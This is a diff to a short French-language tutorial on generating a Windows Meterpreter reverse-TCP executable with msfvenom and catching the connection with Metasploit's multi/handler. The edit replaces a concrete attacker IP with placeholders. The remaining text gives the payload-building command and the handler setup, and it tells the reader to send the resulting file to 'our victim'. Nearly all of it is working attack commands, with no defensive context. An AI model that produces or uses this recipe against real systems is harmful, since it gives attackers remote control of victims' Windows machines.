@@ -5,7 +5,7 @@
 Tout d'abord il faut commencer par donner le chemin du fichier :
 ```Kali
 ┌──(kali㉿DESKTOPEnzo)-[~/Desktop]
-└─$ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.18.172.50 LPORT=4444 -f exe -o /home/WIN_11.exe
+└─$ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP.Kali> LPORT=<Port_voulu> -f exe -o <Chemin/nom.exe>
 ```
 Une fois cela fait il faut lancer msf console 
 ```Shell
@@ -47,8 +47,8 @@ msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
 payload => windows/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 172.18.172.50
-LHOST => 172.18.172.50
+msf6 exploit(multi/handler) > set LHOST <IP.Kali>
+LHOST => <IP.Kali>
 msf6 exploit(multi/handler) > exploit
 ```
 On se retrouve au chemin du fichier indiqué et on l'envoie à notre victime.
